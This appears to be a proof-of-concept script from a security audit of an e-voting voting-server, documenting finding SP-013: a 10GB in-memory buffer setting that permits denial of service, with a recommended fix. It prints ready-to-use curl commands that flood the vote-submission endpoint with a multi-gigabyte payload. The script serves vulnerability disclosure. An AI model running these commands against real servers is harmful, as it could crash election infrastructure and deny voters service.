#!/usr/bin/env python3
"""
PoC: SP-013 — 10GB In-Memory Buffer DoS

The voting-server's application.yaml sets:
  spring.codec.max-in-memory-size: 10GB

This allows a single HTTP request body to allocate up to 10GB of
JVM heap memory, enabling trivial denial-of-service against the
voting infrastructure.

Source: e-voting/voting-server/src/main/resources/application.yaml:14
"""
import sys

def demonstrate():
    print("=" * 60)
    print("SP-013: 10GB In-Memory Buffer DoS PoC")
    print("=" * 60)
    print()
    print("Vulnerable configuration (application.yaml:14):")
    print("  spring:")
    print("    codec:")
    print("      max-in-memory-size: 10GB")
    print()
    print("Spring WebFlux will buffer up to 10GB per request body")
    print("in JVM heap before processing.")
    print()
    print("Attack scenario:")
    print("  curl -X POST https://voting-server/vs-ws-rest/api/v1/... \\")
    print("    -H 'Content-Type: application/json' \\")
    print("    -d @/dev/urandom \\")
    print("    --limit-rate 100M")
    print()
    print("Single request impact:")
    print("  - Allocates up to 10GB heap")
    print("  - Default JVM heap is typically 2-8GB")
    print("  - One request → OutOfMemoryError → JVM crash")
    print("  - Voting server becomes unavailable during election")
    print()
    print("Recommended fix:")
    print("  spring.codec.max-in-memory-size: 256KB  (Spring default)")
    print("  Or at most 10MB for the largest legitimate payload.")
    print()

    # Generate the actual curl command
    print("Reproduction curl command:")
    print("-" * 60)
    print("""
# Generate a 5GB payload (half the limit, enough to cause issues)
python3 -c "import sys; sys.stdout.buffer.write(b'A' * (5 * 1024**3))" | \\
  curl -X POST http://voting-server:8080/vs-ws-rest/api/v1/processor/voting/sendvote \\
    -H 'Content-Type: application/json' \\
    --data-binary @- \\
    -v 2>&1
""")

    print("Also note: RSocket fragment-size is set to 10MB (line 10, 43)")
    print("  spring.rsocket.server.fragment-size: 10MB")
    print("  voting-server.rsocket.server.fragment-size: 10485760")
    print("  This allows large RSocket frames that can also cause memory pressure.")

if __name__ == "__main__":
    demonstrate()
